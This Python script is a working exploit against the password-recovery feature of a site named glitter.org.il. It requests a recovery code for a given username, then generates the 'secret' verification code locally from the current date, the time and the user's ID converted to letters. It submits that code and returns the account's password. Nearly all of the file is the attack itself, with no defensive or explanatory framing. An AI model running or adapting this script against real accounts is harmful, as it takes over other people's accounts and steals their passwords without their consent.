import requests
from datetime import datetime
from datetime import date

def get_password(sock, username, user_id):
    """
    function that gets username and user id and return the password of the user by using the forgot password option
    and calc the verify code
    :param sock: the socket
    :param username: the username of the account
    :param user_id: the user id of the account
    :return: the password
    """
    password = ""

    URL = 'http://glitter.org.il/password-recovery-code-request'
    postdata = username
    resp = requests.post(URL, json=postdata)        # get an email of the verify code
    code = calcCode(user_id)        # the verify code

    URL = 'http://glitter.org.il/password-recovery-code-verification'
    postdata = [username, code]
    resp = requests.post(URL, json=postdata)         # send the verify code and get the password
    password = resp.text
    password = password[1:-1]          # cut the " "
    return str(password)

def calcCode(user_id):
    """
    function that calc your verify code by search for date and time and add the user id in letters + 1
    :param user_id: the user id
    :return: the verify code
    """
    # INITIALIZE
    code = ""
    alpha_code = ""
    user_id = int(user_id)
    # get the current date
    today = date.today()
    today = today.strftime("%d%m")
    # get the current time
    now = datetime.now()
    now = now.strftime("%H%M")
    # get the middle code, calc like that - every number in the user id plus 1 in letters
    # for example user id: 945 ---> 1056 ---> JEF
    user_id = str(user_id)
    for i in range(len(user_id)):
        alpha_code += chr(ord(user_id[i]) + 17)  # the difference between number to his ascii value capital letter + 1
    code = today + alpha_code + now         # the formula of the verify code
    return code